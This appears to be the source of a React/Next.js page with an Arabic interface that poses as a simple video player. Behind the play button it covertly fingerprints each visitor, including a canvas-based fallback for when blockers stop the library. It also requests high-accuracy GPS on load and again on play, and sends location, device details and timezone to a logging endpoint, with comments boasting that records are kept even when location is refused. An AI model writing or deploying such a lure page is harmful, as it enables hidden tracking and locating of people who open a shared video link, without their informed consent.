"use client";

import { useEffect, useState } from 'react';
import * as fpjs from '@fingerprintjs/fingerprintjs';

function CustomPlayer({ url, onPlay }: { url: string, onPlay: () => void }) {
  const [interacted, setInteracted] = useState(false);

  const handleInteraction = () => {
    if (!interacted) {
      setInteracted(true);
      onPlay();
    }
  };

  if (!url) return null;

  let player = null;
  const playerStyle = { position: 'absolute' as const, top: 0, left: 0, width: '100%', height: '100%' };
  
  if (url.includes('youtube.com') || url.includes('youtu.be')) {
    const videoId = url.includes('v=') ? url.split('v=')[1].split('&')[0] : url.split('/').pop();
    player = <iframe style={playerStyle} src={`https://www.youtube.com/embed/${videoId}?autoplay=${interacted ? 1 : 0}`} frameBorder="0" allowFullScreen allow="autoplay"></iframe>;
  } else if (url.includes('facebook.com')) {
    const fbUrl = encodeURIComponent(url);
    player = <iframe src={`https://www.facebook.com/plugins/video.php?href=${fbUrl}&show_text=false&autoplay=${interacted ? 'true' : 'false'}`} style={{...playerStyle, border: 'none', overflow: 'hidden'}} scrolling="no" frameBorder="0" allowFullScreen={true} allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>;
  } else {
    player = <video src={url} controls style={playerStyle} onPlay={onPlay}></video>;
  }

  return (
    <div style={{ position: 'relative', width: '100%', borderRadius: '12px', overflow: 'hidden', backgroundColor: '#000', aspectRatio: '16/9' }}>
      {!interacted && (
        <button 
          type="button"
          onClick={handleInteraction}
          style={{
            position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', 
            zIndex: 10, cursor: 'pointer', background: 'linear-gradient(180deg, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0.85) 100%)',
            display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
            color: 'white', border: 'none', fontFamily: 'inherit', padding: '1rem'
          }}
        >
          <div style={{
            width: '74px', height: '74px', 
            background: 'linear-gradient(135deg, #ef4444 0%, #dc2626 100%)', 
            borderRadius: '50%',
            display: 'flex', justifyContent: 'center', alignItems: 'center', marginBottom: '1.2rem',
            boxShadow: '0 8px 25px rgba(239, 68, 68, 0.6), 0 0 0 6px rgba(239, 68, 68, 0.2)',
            transition: 'transform 0.2s ease'
          }}>
            <div style={{
              width: 0, height: 0, 
              borderTop: '13px solid transparent', 
              borderBottom: '13px solid transparent',
              borderLeft: '22px solid white', 
              marginLeft: '5px'
            }}></div>
          </div>
          <h2 style={{ fontSize: '1.3rem', fontWeight: 'bold', margin: 0, color: '#f8fafc', textShadow: '0 2px 8px rgba(0,0,0,0.8)' }}>
            اضغط هنا لتشغيل الفيديو
          </h2>
        </button>
      )}
      {interacted ? player : null}
    </div>
  );
}

export default function Home() {
  const [videoUrl, setVideoUrl] = useState<string | null>(null);
  const [title, setTitle] = useState<string>('مشغل الفيديو');
  const [loading, setLoading] = useState(true);
  const [logSent, setLogSent] = useState(false);
  const [mounted, setMounted] = useState(false);
  const [cachedFp, setCachedFp] = useState<string>('unknown');

  const [cachedCoords, setCachedCoords] = useState<{ lat: number; lon: number } | null>(null);

  useEffect(() => {
    setMounted(true);

    // Preload Fingerprint in background on load
    try {
      const loader = fpjs.default?.load || fpjs.load;
      if (loader) {
        loader()
          .then(fp => fp.get())
          .then(res => {
            if (res.visitorId) setCachedFp(res.visitorId);
          })
          .catch(() => {});
      }
    } catch (e) {}

    // Request Location on page mount as well
    if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setCachedCoords({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    // Fetch video URL and title
    fetch('/api/video', { cache: 'no-store' })
      .then(res => res.json())
      .then(data => {
        let url = data.videoUrl;
        if (data.title) setTitle(data.title);
        
        // Fix old upload URLs to use the streaming API
        if (url && url.startsWith('/uploads/')) {
          url = url.replace('/uploads/', '/api/file/');
        }

        // Fix Facebook Reel URLs 
        if (url && url.includes('facebook.com/reel/')) {
          const reelId = url.split('/reel/')[1].split('/')[0].split('?')[0];
          url = `https://www.facebook.com/video.php?v=${reelId}`;
        }
        setVideoUrl(url);
        setLoading(false);
      });
  }, []);

  // Generate fallback device ID if FingerprintJS is blocked
  const getFallbackFingerprint = () => {
    if (typeof window === 'undefined') return 'server_' + Math.random().toString(36).substring(2, 12);
    try {
      let storedId = localStorage.getItem('_viewer_fid');
      if (!storedId) {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        let canvasHash = 'c';
        if (ctx) {
          ctx.textBaseline = 'top';
          ctx.font = "14px 'Arial'";
          ctx.fillText("video_view_fp", 2, 2);
          canvasHash = canvas.toDataURL().slice(-16);
        }
        storedId = 'fp_' + canvasHash + '_' + Math.random().toString(36).substring(2, 10);
        localStorage.setItem('_viewer_fid', storedId);
      }
      return storedId;
    } catch (e) {
      return 'anon_' + Math.random().toString(36).substring(2, 12);
    }
  };

  const handlePlay = () => {
    if (logSent) return;
    setLogSent(true);

    // 1. Collect Device Specs IMMEDIATELY
    const fingerprint = (cachedFp && cachedFp !== 'unknown') ? cachedFp : getFallbackFingerprint();
    const screenResolution = typeof window !== 'undefined' ? `${window.screen.width}x${window.screen.height}` : null;
    const language = typeof navigator !== 'undefined' ? navigator.language : null;
    const timezone = typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : null;
    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : null;

    // 2. Send Log IMMEDIATELY (Zero Delay, 100% Recorded even if location rejected)
    const logPayload = {
      fingerprint,
      latitude: cachedCoords?.lat ?? null,
      longitude: cachedCoords?.lon ?? null,
      userAgent,
      screenResolution,
      language,
      timezone
    };

    fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(logPayload),
      keepalive: true
    })
      .then(res => res.json())
      .then(data => {
        const logId = data?.log?.id;
        
        // 3. If GPS was not cached and log was created, request GPS in background and PATCH if allowed
        if (logId && !cachedCoords && typeof navigator !== 'undefined' && 'geolocation' in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              const lat = pos.coords.latitude;
              const lon = pos.coords.longitude;
              setCachedCoords({ lat, lon });

              // Update the already created log with exact GPS coordinates
              fetch('/api/log', {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: logId, latitude: lat, longitude: lon }),
                keepalive: true
              }).catch(() => {});
            },
            (err) => {
              console.log("GPS rejected or unavailable, log already saved with device fingerprint & IP.");
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          );
        }
      })
      .catch((err) => {
        console.error("Immediate logging failed:", err);
      });
  };

  if (loading || !mounted) {
    return (
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '100dvh', backgroundColor: '#0a0d14', color: '#94a3b8', fontSize: '1.1rem', fontFamily: 'Arial, sans-serif' }} dir="rtl">
        جاري التحميل...
      </div>
    );
  }

  return (
    <main style={{ 
      padding: '0.75rem', 
      display: 'flex', 
      flexDirection: 'column', 
      justifyContent: 'center', 
      alignItems: 'center', 
      minHeight: '100dvh',
      backgroundColor: '#0a0d14',
      boxSizing: 'border-box'
    }} dir="rtl">
      <div style={{ 
        width: '100%', 
        maxWidth: '960px', 
        padding: '1.2rem', 
        borderRadius: '16px',
        backgroundColor: 'rgba(20, 20, 28, 0.95)',
        border: '2px solid #ef4444',
        boxShadow: '0 0 25px rgba(239, 68, 68, 0.35), 0 25px 50px -12px rgba(0, 0, 0, 0.85)',
        backdropFilter: 'blur(16px)',
        WebkitBackdropFilter: 'blur(16px)'
      }}>
        <h1 style={{ 
          marginBottom: '1.2rem', 
          textAlign: 'center', 
          fontSize: '1.6rem', 
          fontWeight: 'bold', 
          color: '#f87171',
          letterSpacing: '-0.01em',
          lineHeight: 1.4,
          textShadow: '0 2px 10px rgba(239, 68, 68, 0.3)'
        }}>
          {title}
        </h1>
        
        {videoUrl ? (
          <div style={{ borderRadius: '12px', overflow: 'hidden', width: '100%', border: '1px solid rgba(239, 68, 68, 0.5)', boxShadow: '0 10px 30px rgba(0,0,0,0.6)' }}>
            <CustomPlayer url={videoUrl} onPlay={handlePlay} />
          </div>
        ) : (
          <p style={{ textAlign: 'center', color: '#94a3b8', padding: '2rem 0' }}>لا يوجد فيديو متاح حالياً.</p>
        )}
        
      </div>
    </main>
  );
}
